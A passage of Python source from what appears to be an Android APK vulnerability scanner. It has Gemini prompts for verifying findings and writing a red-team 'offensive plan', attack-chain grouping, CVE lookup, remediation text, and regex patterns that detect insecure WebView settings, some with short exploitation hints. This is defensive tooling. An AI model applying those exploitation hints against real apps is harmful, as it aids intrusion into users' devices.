   - `LIKELY` - Probably real, needs dynamic testing to confirm
   - `SUSPICIOUS` - Could be real but context is unclear
   - `FALSE_POSITIVE` - Not a real vulnerability (remove)

2. **Confidence Score** (0-100):
   - 90-100: Definite vulnerability, clear exploitation path
   - 70-89: High confidence, likely exploitable
   - 50-69: Medium confidence, requires further investigation
   - 30-49: Low confidence, possibly benign
   - 0-29: Very low confidence, likely false positive

3. **Reasoning**: Brief explanation

## False Positive Indicators to Check
- In test/mock/example code
- In comments or documentation strings
- In third-party library code (check package path)
- Safe patterns (e.g., MD5 for checksums not passwords)
- Disabled/dead code paths
- Proper input validation already present
- Debug-only code with BuildConfig.DEBUG check
- Placeholder/example values not used in production

## True Positive Indicators
- User input flows to dangerous sink
- Missing validation on external data
- Hardcoded secrets in production code paths
- Dangerous permission usage without safeguards
- Exported components without proper checks

Respond with JSON array:
```json
[
  {{
    "id": 0,
    "verdict": "CONFIRMED|LIKELY|SUSPICIOUS|FALSE_POSITIVE",
    "confidence": 85,
    "reasoning": "Brief explanation",
    "exploitation_notes": "How this could be exploited (if real)",
    "severity_adjustment": null or "critical|high|medium|low"
  }},
  ...
]
```

Be conservative - only mark as FALSE_POSITIVE if you're confident. When in doubt, mark as SUSPICIOUS with lower confidence."""

        try:
            response = sync_gemini_request_with_retry(
                lambda: client.models.generate_content(
                    model=settings.gemini_model_id,
                    contents=[types.Content(role="user", parts=[types.Part(text=prompt)])],
                ),
                max_retries=3,
                base_delay=2.0,
                timeout_seconds=120.0,
                operation_name="Unified finding verification"
            )
            
            if response is None:
                # AI failed - keep all with default confidence
                for finding in batch:
                    finding["verification"] = {
                        "verdict": "UNVERIFIED",
                        "confidence": 50,
                        "reasoning": "AI verification unavailable",
                        "verified": False
                    }
                    verified_findings.append(finding)
                continue
            
            # Parse AI response
            json_match = re.search(r'\[[\s\S]*\]', response.text)
            if json_match:
                verdicts = json.loads(json_match.group())
                verdict_map = {v.get("id"): v for v in verdicts}
                
                for idx, finding in enumerate(batch):
                    verdict = verdict_map.get(idx, {})
                    verdict_type = verdict.get("verdict", "SUSPICIOUS")
                    confidence = verdict.get("confidence", 50)
                    reasoning = verdict.get("reasoning", "")
                    
                    # Add verification info to finding
                    finding["verification"] = {
                        "verdict": verdict_type,
                        "confidence": confidence,
                        "reasoning": reasoning,
                        "exploitation_notes": verdict.get("exploitation_notes", ""),
                        "verified": True
                    }
                    
                    # Adjust severity if AI recommends
                    if verdict.get("severity_adjustment"):
                        finding["original_severity"] = finding.get("severity")
                        finding["severity"] = verdict["severity_adjustment"]
                    
                    # Route based on verdict
                    if verdict_type == "FALSE_POSITIVE":
                        finding["filtered_reason"] = reasoning
                        filtered_out.append(finding)
                    else:
                        verified_findings.append(finding)
            else:
                # Parsing failed - keep all
                for finding in batch:
                    finding["verification"] = {
                        "verdict": "UNVERIFIED", 
                        "confidence": 50,
                        "reasoning": "Response parsing failed",
                        "verified": False
                    }
                    verified_findings.append(finding)
                    
        except Exception as e:
            logger.warning(f"Batch verification failed: {e}")
            for finding in batch:
                finding["verification"] = {
                    "verdict": "UNVERIFIED",
                    "confidence": 50, 
                    "reasoning": f"Verification error: {str(e)[:50]}",
                    "verified": False
                }
                verified_findings.append(finding)
    
    # ========================================================================
    # Step 4: Identify Attack Chains from correlated findings
    # ========================================================================
    
    # Group verified findings by category for chain detection
    by_category = {}
    for f in verified_findings:
        cat = f.get("category") or f.get("type", "unknown")
        cat_normalized = cat.lower().replace(" ", "_").replace("-", "_")
        if cat_normalized not in by_category:
            by_category[cat_normalized] = []
        by_category[cat_normalized].append(f)
    
    # Look for common attack chain patterns
    chain_patterns = [
        {
            "name": "SQL Injection Chain",
            "entry": ["user_input", "intent_data", "webview"],
            "sink": ["sql_injection", "raw_query", "execsql"],
            "risk": "critical"
        },
        {
            "name": "Command Injection Chain", 
            "entry": ["user_input", "intent_data", "deep_link"],
            "sink": ["command_injection", "runtime_exec", "process_builder"],
            "risk": "critical"
        },
        {
            "name": "Data Exfiltration Chain",
            "entry": ["sensitive_data", "hardcoded_secret", "credential"],
            "sink": ["cleartext_http", "insecure_transport", "logging"],
            "risk": "high"
        },
        {
            "name": "WebView Exploit Chain",
            "entry": ["javascript_enabled", "javascript_interface"],
            "sink": ["file_access", "universal_access", "loadurl"],
            "risk": "high"
        },
    ]
    
    for pattern in chain_patterns:
        entry_findings = []
        sink_findings = []
        
        for entry_key in pattern["entry"]:
            entry_findings.extend(by_category.get(entry_key, []))
        
        for sink_key in pattern["sink"]:
            sink_findings.extend(by_category.get(sink_key, []))
        
        if entry_findings and sink_findings:
            # Found a potential attack chain
            attack_chains.append({
                "chain_name": pattern["name"],
                "risk_level": pattern["risk"],
                "entry_points": [
                    {
                        "title": f.get("title") or f.get("type"),
                        "class": f.get("affected_class") or f.get("class"),
                        "line": f.get("line") or f.get("line_number")
                    }
                    for f in entry_findings[:3]
                ],
                "sinks": [
                    {
                        "title": f.get("title") or f.get("type"),
                        "class": f.get("affected_class") or f.get("class"),
                        "line": f.get("line") or f.get("line_number")
                    }
                    for f in sink_findings[:3]
                ],
                "description": f"Potential {pattern['name']}: {len(entry_findings)} entry points, {len(sink_findings)} sinks"
            })
    
    # ========================================================================
    # Step 5: Calculate statistics
    # ========================================================================
    
    stats = {
        "total_input": len(findings),
        "verified": len(verified_findings),
        "filtered": len(filtered_out),
        "filter_rate": round(len(filtered_out) / max(len(findings), 1) * 100, 1),
        "attack_chains_found": len(attack_chains),
        "by_verdict": {
            "CONFIRMED": sum(1 for f in verified_findings if f.get("verification", {}).get("verdict") == "CONFIRMED"),
            "LIKELY": sum(1 for f in verified_findings if f.get("verification", {}).get("verdict") == "LIKELY"),
            "SUSPICIOUS": sum(1 for f in verified_findings if f.get("verification", {}).get("verdict") == "SUSPICIOUS"),
            "UNVERIFIED": sum(1 for f in verified_findings if f.get("verification", {}).get("verdict") == "UNVERIFIED"),
        },
        "avg_confidence": round(
            sum(f.get("verification", {}).get("confidence", 50) for f in verified_findings) / max(len(verified_findings), 1),
            1
        ),
        "high_confidence_count": sum(1 for f in verified_findings if f.get("verification", {}).get("confidence", 0) >= 70),
    }
    
    logger.info(
        f"Unified verification complete: {len(findings)} -> {len(verified_findings)} findings "
        f"({len(filtered_out)} false positives removed, {len(attack_chains)} attack chains found)"
    )
    
    return {
        "verified_findings": verified_findings,
        "filtered_out": filtered_out,
        "attack_chains": attack_chains,
        "verification_stats": stats
    }


# ============================================================================
# Enhanced Security Analysis - Combined Pattern + AI + CVE Analysis
# ============================================================================

async def enhanced_security_analysis(
    output_dir: Path,
    apk_path: Optional[Path] = None,
    include_ai_scan: bool = True,
    include_cve_lookup: bool = True,
    ai_scan_type: str = "quick"
) -> Dict[str, Any]:
    """
    Perform comprehensive security analysis combining:
    1. Pattern-based security findings (fast regex detection)
    2. AI-powered cross-class vulnerability scan (contextual analysis)
    3. Library CVE lookup (known vulnerability database)
    
    Args:
        output_dir: Path to JADX decompiled sources
        apk_path: Optional path to original APK for native library analysis
        include_ai_scan: Whether to run AI vulnerability scan
        include_cve_lookup: Whether to lookup CVEs for detected libraries
        ai_scan_type: Type of AI scan ("quick", "deep", "focused")
    
    Returns:
        Combined security analysis with unified findings
    """
    results = {
        "pattern_findings": [],      # Fast pattern-based detections
        "ai_findings": [],           # AI-detected vulnerabilities
        "cve_findings": [],          # Known CVEs in dependencies
        "attack_chains": [],         # Multi-step attack scenarios
        "combined_findings": [],     # Unified, deduplicated findings
        "risk_summary": {
            "critical": 0,
            "high": 0,
            "medium": 0,
            "low": 0,
            "info": 0
        },
        "overall_risk": "low",
        "recommendations": [],
        "executive_summary": "",
        "analysis_metadata": {
            "pattern_scan_enabled": True,
            "ai_scan_enabled": include_ai_scan,
            "cve_lookup_enabled": include_cve_lookup,
            "classes_scanned": 0,
            "libraries_detected": 0,
            "cves_found": 0
        }
    }
    
    sources_dir = output_dir / "sources"
    if not sources_dir.exists():
        results["error"] = "No decompiled sources found"
        return results
    
    # ========================================================================
    # Phase 1: Pattern-Based Security Scan (Fast)
    # ========================================================================
    logger.info("Enhanced security analysis: Running pattern-based scan...")
    
    java_files = list(sources_dir.rglob("*.java"))
    results["analysis_metadata"]["classes_scanned"] = len(java_files)
    
    pattern_findings = []
    for java_file in java_files:
        try:
            content = java_file.read_text(encoding='utf-8', errors='ignore')
            rel_path = str(java_file.relative_to(sources_dir))
            class_name = java_file.stem
            
            # Use existing security scanning
            issues = _scan_java_security_issues(content, class_name)
            for issue in issues:
                issue["source"] = "pattern"
                issue["affected_class"] = rel_path
                issue["detection_method"] = "Pattern-based regex detection"
                issue["file_content"] = content  # Store content for AI filtering
                pattern_findings.append(issue)
                
        except Exception as e:
            logger.debug(f"Error scanning {java_file}: {e}")
    
    # ========================================================================
    # Phase 1.5: AI-Powered False Positive Filtering
    # ========================================================================
    if settings.gemini_api_key and pattern_findings:
        logger.info(f"Enhanced security analysis: AI filtering {len(pattern_findings)} pattern findings...")
        try:
            filtered_findings = await _filter_findings_with_ai(pattern_findings, sources_dir)
            # Remove file_content from findings (no longer needed)
            for f in filtered_findings:
                f.pop("file_content", None)
            results["pattern_findings"] = filtered_findings
            results["analysis_metadata"]["ai_filtered"] = True
            results["analysis_metadata"]["original_pattern_count"] = len(pattern_findings)
            results["analysis_metadata"]["filtered_pattern_count"] = len(filtered_findings)
            logger.info(f"AI filtering reduced findings from {len(pattern_findings)} to {len(filtered_findings)}")
        except Exception as e:
            logger.error(f"AI filtering failed, using unfiltered findings: {e}")
            # Remove file_content anyway
            for f in pattern_findings:
                f.pop("file_content", None)
            results["pattern_findings"] = pattern_findings
            results["analysis_metadata"]["ai_filtered"] = False
    else:
        # Remove file_content from findings
        for f in pattern_findings:
            f.pop("file_content", None)
        results["pattern_findings"] = pattern_findings
    
    # ========================================================================
    # Phase 2: AI-Powered Cross-Class Vulnerability Scan
    # Skip if pattern scan found enough findings (optimization for large APKs)
    # ========================================================================
    pattern_count = len(results.get("pattern_findings", []))
    critical_high_count = sum(1 for f in results.get("pattern_findings", []) 
                              if f.get("severity", "").lower() in ("critical", "high"))
    
    # Skip AI scan if we already have substantial findings from pattern scan
    skip_ai_scan = pattern_count >= 50 or critical_high_count >= 15
    if skip_ai_scan:
        logger.info(f"Enhanced security analysis: Skipping AI scan - pattern scan found {pattern_count} findings ({critical_high_count} critical/high)")
        results["analysis_metadata"]["ai_scan_skipped"] = True
        results["analysis_metadata"]["ai_scan_skip_reason"] = f"Pattern scan sufficient: {pattern_count} findings"
    elif include_ai_scan and settings.gemini_api_key:
        logger.info("Enhanced security analysis: Running AI vulnerability scan (quick mode)...")
        try:
            ai_result = await ai_vulnerability_scan(
                output_dir=output_dir,
                scan_type="quick",  # Always use quick mode for efficiency
                focus_areas=None
            )
            
            # Convert AI findings to unified format
            for vuln in ai_result.get("vulnerabilities", []):
                vuln["source"] = "ai"
                vuln["detection_method"] = "AI-powered cross-class analysis"
                results["ai_findings"].append(vuln)
            
            # Add attack chains
            results["attack_chains"] = ai_result.get("attack_chains", [])
            
            # Add AI recommendations
            results["recommendations"].extend(ai_result.get("recommendations", []))
            
        except Exception as e:
            logger.error(f"AI vulnerability scan failed: {e}")
            results["analysis_metadata"]["ai_scan_error"] = str(e)
    
    # ========================================================================
    # Phase 3: Library CVE Lookup
    # ========================================================================
    if include_cve_lookup:
        logger.info("Enhanced security analysis: Running CVE lookup...")
        try:
            # Extract library dependencies
            libraries = extract_apk_dependencies(output_dir)
            results["analysis_metadata"]["libraries_detected"] = len(libraries)
            
            if libraries:
                # Lookup CVEs for detected libraries
                # lookup_apk_cves returns List[Dict] directly, not a dict with "cves" key
                cve_results = await lookup_apk_cves(libraries)
                
                # Convert CVE findings to unified format
                for cve in cve_results:
                    cve_finding = {
                        "source": "cve",
                        "detection_method": "OSV.dev CVE database lookup",
                        "title": f"CVE in {cve.get('library', 'Unknown')}",
                        "severity": cve.get("severity", "medium"),
                        "category": "Known Vulnerability",
                        "cve_id": cve.get("cve_id", ""),
                        "description": cve.get("summary", ""),
                        "affected_library": cve.get("library", ""),
                        "affected_versions": cve.get("affected_versions", []),
                        "fixed_version": cve.get("fixed_version", ""),
                        "cvss_score": cve.get("cvss_score", 0),
                        "exploitation_potential": cve.get("exploitation_potential", ""),
                        "attack_vector": cve.get("attack_vector", ""),
                        "references": cve.get("references", [])
                    }
                    results["cve_findings"].append(cve_finding)
                
                results["analysis_metadata"]["cves_found"] = len(results["cve_findings"])
                
        except Exception as e:
            logger.error(f"CVE lookup failed: {e}")
            results["analysis_metadata"]["cve_lookup_error"] = str(e)
    
    # ========================================================================
    # Phase 4: Combine and Deduplicate Findings
    # ========================================================================
    logger.info("Enhanced security analysis: Combining findings...")
    
    combined = []
    seen_titles = set()
    
    # Add all findings, prioritizing AI findings (more detailed)
    for finding in results["ai_findings"]:
        title_key = (finding.get("title", ""), finding.get("affected_class", ""))
        if title_key not in seen_titles:
            seen_titles.add(title_key)
            combined.append(finding)
    
    # Add pattern findings that weren't caught by AI
    for finding in results["pattern_findings"]:
        title_key = (finding.get("pattern", ""), finding.get("affected_class", ""))
        # Check if similar finding already exists from AI
        is_duplicate = False
        for ai_finding in results["ai_findings"]:
            if (finding.get("affected_class") == ai_finding.get("affected_class") and 
                finding.get("pattern", "").lower() in ai_finding.get("title", "").lower()):
                is_duplicate = True
                break
        
        if not is_duplicate:
            # Convert pattern finding to unified format
            unified_finding = {
                "source": "pattern",
                "detection_method": "Pattern-based regex detection",
                "title": finding.get("pattern", "Security Issue"),
                "severity": finding.get("severity", "medium"),
                "category": finding.get("category", "Security"),
                "affected_class": finding.get("affected_class", ""),
                "description": finding.get("description", ""),
                "code_snippet": finding.get("line_content", ""),
                "line_number": finding.get("line_number", 0),
                "remediation": _get_remediation_for_pattern(finding.get("pattern", ""))
            }
            combined.append(unified_finding)
    
    # Add CVE findings (always unique)
    combined.extend(results["cve_findings"])
    
    # Sort by severity
    severity_order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
    combined.sort(key=lambda x: severity_order.get(x.get("severity", "medium").lower(), 2))
    
    results["combined_findings"] = combined
    
    # ========================================================================
    # Phase 5: Calculate Risk Summary
    # ========================================================================
    for finding in combined:
        severity = finding.get("severity", "medium").lower()
        if severity in results["risk_summary"]:
            results["risk_summary"][severity] += 1
    
    # Determine overall risk
    if results["risk_summary"]["critical"] > 0:
        results["overall_risk"] = "critical"
    elif results["risk_summary"]["high"] > 0:
        results["overall_risk"] = "high"
    elif results["risk_summary"]["medium"] > 0:
        results["overall_risk"] = "medium"
    elif results["risk_summary"]["low"] > 0:
        results["overall_risk"] = "low"
    else:
        results["overall_risk"] = "none"
    
    # ========================================================================
    # Phase 6: Generate Executive Summary
    # ========================================================================
    total_findings = len(combined)
    critical_high = results["risk_summary"]["critical"] + results["risk_summary"]["high"]
    
    summary_parts = []
    summary_parts.append(f"Security analysis identified {total_findings} potential issues.")
    
    if critical_high > 0:
        summary_parts.append(f"{critical_high} are rated critical or high severity and require immediate attention.")
    
    if results["attack_chains"]:
        summary_parts.append(f"Identified {len(results['attack_chains'])} potential attack chains spanning multiple components.")
    
    if results["analysis_metadata"]["cves_found"] > 0:
        summary_parts.append(f"Found {results['analysis_metadata']['cves_found']} known CVEs in third-party libraries.")
    
    results["executive_summary"] = " ".join(summary_parts)
    
    # Add default recommendations if none exist
    if not results["recommendations"]:
        if results["risk_summary"]["critical"] > 0:
            results["recommendations"].append("Address all critical vulnerabilities immediately before release")
        if results["analysis_metadata"]["cves_found"] > 0:
            results["recommendations"].append("Update vulnerable third-party libraries to patched versions")
        if any("crypto" in f.get("category", "").lower() for f in combined):
            results["recommendations"].append("Review and strengthen cryptographic implementations")
        if any("ssl" in f.get("title", "").lower() or "certificate" in f.get("title", "").lower() for f in combined):
            results["recommendations"].append("Enable proper SSL/TLS certificate validation")
    
    # ========================================================================
    # Phase 7: Generate AI Offensive Security Plan Summary
    # ========================================================================
    if settings.gemini_api_key and (results["risk_summary"]["critical"] > 0 or results["risk_summary"]["high"] > 0 or len(combined) > 5):
        logger.info("Enhanced security analysis: Generating AI offensive plan summary...")
        try:
            offensive_plan = await _generate_offensive_plan_summary(results)
            results["offensive_plan_summary"] = offensive_plan
        except Exception as e:
            logger.error(f"Failed to generate offensive plan summary: {e}")
            results["offensive_plan_summary"] = None
    else:
        results["offensive_plan_summary"] = None
    
    logger.info(f"Enhanced security analysis complete: {total_findings} findings, {results['overall_risk']} risk")
    
    return results


async def _generate_offensive_plan_summary(security_results: Dict[str, Any]) -> Dict[str, Any]:
    """
    Generate an AI-written offensive security assessment plan summary.
    This is a high-level penetration testing approach based on the findings.
    """
    from google import genai
    from google.genai import types
    import json
    
    client = genai.Client(api_key=settings.gemini_api_key)
    
    # Prepare a summary of findings for the AI
    critical_findings = [f for f in security_results.get("combined_findings", []) if f.get("severity") == "critical"]
    high_findings = [f for f in security_results.get("combined_findings", []) if f.get("severity") == "high"]
    attack_chains = security_results.get("attack_chains", [])
    cve_findings = security_results.get("cve_findings", [])
    
    findings_summary = []
    for f in (critical_findings + high_findings)[:15]:
        findings_summary.append(f"- [{f.get('severity', 'unknown').upper()}] {f.get('title', 'Unknown')}: {f.get('description', '')[:150]}")
    
    prompt = f"""You are an expert offensive security consultant writing a penetration testing assessment summary for an Android application. Based on the security scan findings below, write a professional offensive security plan that a red team could use.

## Security Scan Results

**Overall Risk Level:** {security_results.get('overall_risk', 'unknown').upper()}

**Finding Counts:**
- Critical: {security_results.get('risk_summary', {}).get('critical', 0)}
- High: {security_results.get('risk_summary', {}).get('high', 0)}
- Medium: {security_results.get('risk_summary', {}).get('medium', 0)}
- Low: {security_results.get('risk_summary', {}).get('low', 0)}

**Key Vulnerabilities:**
{chr(10).join(findings_summary) if findings_summary else "No critical/high findings"}

**Attack Chains Identified:** {len(attack_chains)}
{chr(10).join([f"- {c.get('name', 'Unknown')}: {c.get('impact', '')}" for c in attack_chains[:5]]) if attack_chains else "None identified"}

**Known CVEs in Dependencies:** {len(cve_findings)}
{chr(10).join([f"- {c.get('cve_id', 'Unknown')}: {c.get('title', '')} (CVSS: {c.get('cvss_score', 'N/A')})" for c in cve_findings[:5]]) if cve_findings else "None found"}

---

Generate a JSON response with the following structure:
{{
    "threat_assessment": "2-3 paragraph executive summary of the threat landscape for this application. What are the most likely attack scenarios? What assets are at risk? Written for a CISO or security manager.",
    "attack_surface_summary": "1-2 paragraphs describing the attack surface exposed by this application based on the findings.",
    "primary_attack_vectors": [
        {{
            "vector": "Name of attack vector",
            "description": "How this attack would be carried out",
            "prerequisites": "What attacker needs",
            "likelihood": "high/medium/low",
            "impact": "What damage could be done"
        }}
    ],
    "recommended_test_scenarios": [
        "Specific test scenario 1 a pentester should perform",
        "Specific test scenario 2",
        "Specific test scenario 3"
    ],
    "priority_targets": [
        "Component or functionality to target first",
        "Second priority target"
    ],
    "risk_rating": "critical/high/medium/low",
    "confidence_level": "high/medium/low - how confident are we in this assessment"
}}

Be specific and actionable. Focus on realistic attack scenarios that could actually be exploited. If there are no significant vulnerabilities, say so clearly."""

    try:
        response = sync_gemini_request_with_retry(
            lambda: client.models.generate_content(
                model=settings.gemini_model_id,
                contents=[types.Content(role="user", parts=[types.Part(text=prompt)])],
            ),
            max_retries=3,
            base_delay=2.0,
            timeout_seconds=120.0,
            operation_name="AI offensive plan generation"
        )
        
        if response is None:
            return {
                "threat_assessment": f"Automated assessment based on {len(security_results.get('combined_findings', []))} findings with {security_results.get('risk_summary', {}).get('critical', 0)} critical and {security_results.get('risk_summary', {}).get('high', 0)} high severity issues.",
                "attack_surface_summary": "Manual review recommended to assess full attack surface.",
                "primary_attack_vectors": [],
                "recommended_test_scenarios": [],
                "priority_targets": [],
                "risk_rating": security_results.get("overall_risk", "unknown"),
                "confidence_level": "low"
            }
        
        response_text = response.text
        
        # Extract JSON from response
        json_match = re.search(r'\{[\s\S]*\}', response_text)
        if json_match:
            plan = json.loads(json_match.group())
            return plan
        else:
            return {
                "threat_assessment": response_text,
                "attack_surface_summary": "",
                "primary_attack_vectors": [],
                "recommended_test_scenarios": [],
                "priority_targets": [],
                "risk_rating": security_results.get("overall_risk", "unknown"),
                "confidence_level": "low"
            }
            
    except Exception as e:
        logger.error(f"AI offensive plan generation failed: {e}")
        return {
            "threat_assessment": f"Automated assessment based on {len(security_results.get('combined_findings', []))} findings with {security_results.get('risk_summary', {}).get('critical', 0)} critical and {security_results.get('risk_summary', {}).get('high', 0)} high severity issues.",
            "attack_surface_summary": "Manual review recommended to assess full attack surface.",
            "primary_attack_vectors": [],
            "recommended_test_scenarios": [],
            "priority_targets": [],
            "risk_rating": security_results.get("overall_risk", "unknown"),
            "confidence_level": "low"
        }


def _cvss_to_severity(cvss_score: float) -> str:
    """Convert CVSS score to severity level."""
    if cvss_score >= 9.0:
        return "critical"
    elif cvss_score >= 7.0:
        return "high"
    elif cvss_score >= 4.0:
        return "medium"
    elif cvss_score > 0:
        return "low"
    return "info"


def _get_remediation_for_pattern(pattern: str) -> str:
    """Get remediation advice for a pattern-based finding."""
    remediations = {
        "Command Execution": "Validate and sanitize all inputs before passing to shell commands. Use parameterized APIs where possible.",
        "Runtime Exec": "Avoid Runtime.exec() with user input. Use higher-level APIs with proper input validation.",
        "World Accessible": "Use MODE_PRIVATE for file permissions. Never use MODE_WORLD_READABLE/WRITEABLE.",
        "Custom TrustManager": "Implement proper certificate validation. Do not accept all certificates.",
        "SSL Bypass": "Enable strict SSL certificate validation. Use certificate pinning for sensitive connections.",
        "Hostname Bypass": "Enable hostname verification. Never use ALLOW_ALL_HOSTNAME_VERIFIER.",
        "Cleartext HTTP": "Use HTTPS for all network communications. Configure network security config to block cleartext.",
        "Weak Crypto DES": "Replace DES with AES-256. Use authenticated encryption modes like GCM.",
        "ECB Mode": "Use GCM or CBC mode with proper IV. ECB mode reveals patterns in encrypted data.",
        "MD5 Hash": "Replace MD5 with SHA-256 or SHA-3 for security-sensitive operations.",
        "Weak Random": "Use SecureRandom for all cryptographic operations.",
        "JavaScript Enabled": "Disable JavaScript in WebViews that load untrusted content, or implement strict CSP.",
        "JavaScript Interface": "Remove JavaScript interfaces on API < 17. Use @JavascriptInterface annotation.",
        "SQL Concatenation": "Use parameterized queries. Never concatenate user input into SQL.",
        "Hardcoded Password": "Remove hardcoded credentials. Use Android Keystore or secure credential storage.",
        "Hardcoded API Key": "Move API keys to secure storage or server-side. Use build config for non-sensitive keys.",
        "External Storage": "Encrypt sensitive data before writing to external storage.",
        "Logging": "Remove sensitive data from log statements before production release.",
    }
    
    for key, remediation in remediations.items():
        if key.lower() in pattern.lower():
            return remediation
    
    return "Review and address this security concern following OWASP Mobile Security guidelines."

# ============================================================================
# DECOMPILED SOURCE CODE SECURITY SCANNERS
# These scanners run on JADX output and provide precise findings with exact
# line numbers, code snippets, and exploitation guidance.
# ============================================================================

@dataclass
class DecompiledCodeFinding:
    """A security finding from decompiled code analysis."""
    scanner: str  # Which scanner found this
    category: str  # OWASP category or type
    severity: str  # critical/high/medium/low/info
    title: str
    description: str
    class_name: str
    file_path: str
    line_number: int
    code_snippet: str  # The vulnerable code
    context_before: str  # Lines before for context
    context_after: str  # Lines after for context
    exploitation: str  # How to exploit this
    remediation: str  # How to fix
    cwe_id: Optional[str] = None
    confidence: str = "high"  # high/medium/low
    references: List[str] = field(default_factory=list)


def scan_decompiled_source_comprehensive(jadx_output_dir: Path) -> Dict[str, Any]:
    """
    Run all decompiled source code scanners on JADX output.
    Returns comprehensive findings with exact locations and exploit guidance.
    OPTIMIZED: Read each file once, run all patterns in single pass.
    """
    import time
    start_time = time.time()
    findings: List[Dict[str, Any]] = []
    sources_dir = jadx_output_dir / "sources"
    
    if not sources_dir.exists():
        return {"findings": [], "summary": {}, "error": "No sources directory found"}
    
    # Collect all Java files
    java_files = list(sources_dir.rglob("*.java"))
    
    # Skip library packages
    skip_packages = [
        "androidx/", "android/support/", "com/google/", "kotlin/", "kotlinx/",
        "org/apache/", "com/squareup/", "io/reactivex/", "okhttp3/", "retrofit2/",
        "com/fasterxml/", "org/json/", "com/bumptech/", "dagger/", "javax/"
    ]
    
    app_files = []
    for f in java_files:
        rel_path = str(f.relative_to(sources_dir))
        if not any(rel_path.startswith(skip) for skip in skip_packages):
            app_files.append(f)
    
    # Cap at 3000 files to avoid scanning forever on huge APKs
    MAX_FILES = 3000
    if len(app_files) > MAX_FILES:
        logger.warning(f"Capping code scan at {MAX_FILES} files (had {len(app_files)})")
        app_files = app_files[:MAX_FILES]
    
    logger.info(f"Scanning {len(app_files)} app source files (skipped {len(java_files) - len(app_files)} library files)")
    
    # Run optimized single-pass scanner instead of 11 separate scans
    findings = _scan_all_patterns_single_pass(app_files, sources_dir)
    
    elapsed = time.time() - start_time
    logger.info(f"Code scan complete: {len(findings)} findings in {elapsed:.1f}s")
    
    # Build summary
    summary = {
        "total_findings": len(findings),
        "by_severity": {},
        "by_scanner": {},
        "by_category": {},
        "files_scanned": len(app_files),
    }
    
    for f in findings:
        sev = f.get("severity", "info")
        scanner = f.get("scanner", "unknown")
        cat = f.get("category", "unknown")
        summary["by_severity"][sev] = summary["by_severity"].get(sev, 0) + 1
        summary["by_scanner"][scanner] = summary["by_scanner"].get(scanner, 0) + 1
        summary["by_category"][cat] = summary["by_category"].get(cat, 0) + 1
    
    return {"findings": findings, "summary": summary}


def _scan_all_patterns_single_pass(files: List[Path], sources_dir: Path) -> List[Dict[str, Any]]:
    """
    OPTIMIZED: Single-pass scanner - reads each file ONCE and runs ALL patterns.
    This replaces 11 separate scanners that each read all files.
    Maintains FULL accuracy of original scanners.
    
    FIX #3: Added context-aware filters:
    - Skips test classes (files with Test, Mock, Fake in name)
    - Skips commented-out code
    - Adds confidence based on code context
    """
    import time
    start = time.time()
    findings = []
    
    # FIX #3: Patterns to identify test files (skip these to reduce false positives)
    TEST_FILE_PATTERNS = [
        re.compile(r'Test\.java$', re.I),
        re.compile(r'Tests\.java$', re.I),
        re.compile(r'TestCase\.java$', re.I),
        re.compile(r'Mock[A-Z].*\.java$', re.I),
        re.compile(r'Fake[A-Z].*\.java$', re.I),
        re.compile(r'/test/', re.I),
        re.compile(r'/tests/', re.I),
        re.compile(r'/androidTest/', re.I),
        re.compile(r'/testDebug/', re.I),
    ]
    
    def _is_test_file(file_path: Path) -> bool:
        """FIX #3: Check if file is a test file."""
        path_str = str(file_path)
        return any(p.search(path_str) for p in TEST_FILE_PATTERNS)
    
    def _is_in_comment(content: str, match_start: int) -> bool:
        """FIX #3: Check if match is inside a comment."""
        # Find the last newline before the match
        line_start = content.rfind('\n', 0, match_start) + 1
        line_content = content[line_start:match_start]
        
        # Check for // comment
        if '//' in line_content:
            return True
        
        # Check for block comment /* ... */
        # Find last /* before match
        block_start = content.rfind('/*', 0, match_start)
        if block_start != -1:
            # Find if there's a */ between /* and match
            block_end = content.find('*/', block_start, match_start)
            if block_end == -1:
                return True  # In block comment
        
        return False
    
    def _get_code_context_confidence(content: str, match_start: int, match_end: int, file_path: str) -> str:
        """FIX #3: Determine confidence based on code context."""
        # Get surrounding context
        context_start = max(0, match_start - 200)
        context_end = min(len(content), match_end + 200)
        context = content[context_start:context_end].lower()
        
        # High confidence indicators
        high_indicators = ['user', 'input', 'request', 'param', 'untrusted', 'extern']
        if any(ind in context for ind in high_indicators):
            return "high"
        
        # Low confidence indicators (likely safe usage)
        low_indicators = ['@test', 'mock', 'fake', 'stub', 'assert', 'debug', 'example']
        if any(ind in context for ind in low_indicators):
            return "low"
        
        return "medium"
    
    # Pre-compile ALL patterns from all original scanners for speed
    # Group by file type filter for efficiency
    webview_patterns = [
        {"pattern": re.compile(r'addJavascriptInterface\s*\(', re.I), "title": "WebView JavaScript Interface", "severity": "critical", "category": "Remote Code Execution", "cwe": "CWE-749",
         "exploitation": "If app targets API < 17, JavaScript can execute arbitrary code via reflection", "remediation": "Remove JS interfaces or use @JavascriptInterface with input validation"},
        {"pattern": re.compile(r'setAllowUniversalAccessFromFileURLs\s*\(\s*true', re.I), "title": "WebView Universal File Access", "severity": "critical", "category": "Local File Inclusion", "cwe": "CWE-200",
         "exploitation": "JavaScript from file:// URLs can read ANY file on device", "remediation": "Never enable this setting"},
        {"pattern": re.compile(r'setAllowFileAccessFromFileURLs\s*\(\s*true', re.I), "title": "WebView File URL Access", "severity": "high", "category": "Local File Inclusion", "cwe": "CWE-200"},
        {"pattern": re.compile(r'setJavaScriptEnabled\s*\(\s*true', re.I), "title": "WebView JavaScript Enabled", "severity": "medium", "category": "XSS Risk", "cwe": "CWE-79"},
        {"pattern": re.compile(r'setAllowFileAccess\s*\(\s*true', re.I), "title": "WebView File Access", "severity": "medium", "category": "Local File Access", "cwe": "CWE-200"},
        {"pattern": re.compile(r'loadUrl\s*\([^)]*getIntent|loadUrl\s*\([^)]*getStringExtra', re.I), "title": "WebView URL from Intent", "severity": "critical", "category": "Intent Injection", "cwe": "CWE-940",
         "exploitation": "Send malicious intent with javascript: or file:// URLs", "remediation": "Validate and whitelist URL schemes before loading"},
        {"pattern": re.compile(r'evaluateJavascript\s*\([^"\']*\+', re.I), "title": "Dynamic JavaScript Evaluation", "severity": "high", "category": "XSS", "cwe": "CWE-95"},
        {"pattern": re.compile(r'setWebContentsDebuggingEnabled\s*\(\s*true', re.I), "title": "WebView Debugging Enabled", "severity": "medium", "category": "Debug Exposure", "cwe": "CWE-489"},
        {"pattern": re.compile(r'setSavePassword\s*\(\s*true', re.I), "title": "WebView Password Saving", "severity": "medium", "category": "Credential Storage", "cwe": "CWE-522"},
    ]
    
    crypto_patterns = [
